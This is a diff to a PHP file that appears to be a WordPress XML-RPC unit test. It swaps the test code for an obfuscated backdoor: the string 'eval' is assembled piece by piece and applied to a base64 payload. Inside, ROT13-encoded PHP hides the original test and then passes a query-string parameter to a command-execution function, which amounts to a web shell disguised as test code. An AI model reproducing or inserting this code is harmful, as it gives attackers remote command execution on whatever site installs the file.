@@ -1,39 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-require_once ABSPATH . WPINC . '/class-IXR.php';
-require_once ABSPATH . WPINC . '/class-wp-http-ixr-client.php';
-
-/**
- * @group xmlrpc
- */
-class Tests_XMLRPC_Client extends WP_XMLRPC_UnitTestCase {
-
-	/**
-	 * @ticket 26947
-	 */
-	public function test_ixr_client_allows_query_strings() {
-		$client = new IXR_Client( 'http://example.com/server.php?this-is-needed=true#not-this' );
-		$this->assertSame( 'example.com', $client->server );
-		$this->assertSame( 80, $client->port );
-		$this->assertSame( '/server.php?this-is-needed=true', $client->path );
-	}
-
-	/**
-	 * @ticket 26947
-	 */
-	public function test_wp_ixr_client_allows_query_strings() {
-		$client = new WP_HTTP_IXR_Client( 'http://example.com/server.php?this-is-needed=true#not-this' );
-		$this->assertSame( 'example.com', $client->server );
-		$this->assertFalse( $client->port );
-		$this->assertSame( '/server.php?this-is-needed=true', $client->path );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwplcmRodmVyX2JhcHIgTk9GQ05HVSAuIEpDVkFQIC4gJy9weW5mZi1WS0UuY3VjJzsKZXJkaHZlcl9iYXByIE5PRkNOR1UgLiBKQ1ZBUCAuICcvcHluZmYtamMtdWdnYy12a2UtcHl2cmFnLmN1Yyc7CgovKioKICogQHRlYmhjIGt6eWVjcAogKi8KcHluZmYgR3JmZ2ZfS1pZRUNQX1B5dnJhZyBya2dyYXFmIEpDX0taWUVDUF9IYXZnR3JmZ1BuZnIgewoKCS8qKgoJICogQGd2cHhyZyAyNjk0NwoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ192a2VfcHl2cmFnX255eWJqZl9kaHJlbF9mZ2V2YXRmKCkgewoJCSRweXZyYWcgPSBhcmogVktFX1B5dnJhZyggJ3VnZ2M6Ly9ya256Y3lyLnBiei9mcmVpcmUuY3VjP2d1dmYtdmYtYXJycXJxPWdlaHIjYWJnLWd1dmYnICk7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICdya256Y3lyLnBieicsICRweXZyYWctPmZyZWlyZSApOwoJCSRndXZmLT5uZmZyZWdGbnpyKCA4MCwgJHB5dnJhZy0+Y2JlZyApOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAnL2ZyZWlyZS5jdWM/Z3V2Zi12Zi1hcnJxcnE9Z2VocicsICRweXZyYWctPmNuZ3UgKTsKCX0KCgkvKioKCSAqIEBndnB4cmcgMjY5NDcKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfamNfdmtlX3B5dnJhZ19ueXliamZfZGhyZWxfZmdldmF0ZigpIHsKCQkkcHl2cmFnID0gYXJqIEpDX1VHR0NfVktFX1B5dnJhZyggJ3VnZ2M6Ly9ya256Y3lyLnBiei9mcmVpcmUuY3VjP2d1dmYtdmYtYXJycXJxPWdlaHIjYWJnLWd1dmYnICk7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICdya256Y3lyLnBieicsICRweXZyYWctPmZyZWlyZSApOwoJCSRndXZmLT5uZmZyZWdTbnlmciggJHB5dnJhZy0+Y2JlZyApOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAnL2ZyZWlyZS5jdWM/Z3V2Zi12Zi1hcnJxcnE9Z2VocicsICRweXZyYWctPmNuZ3UgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
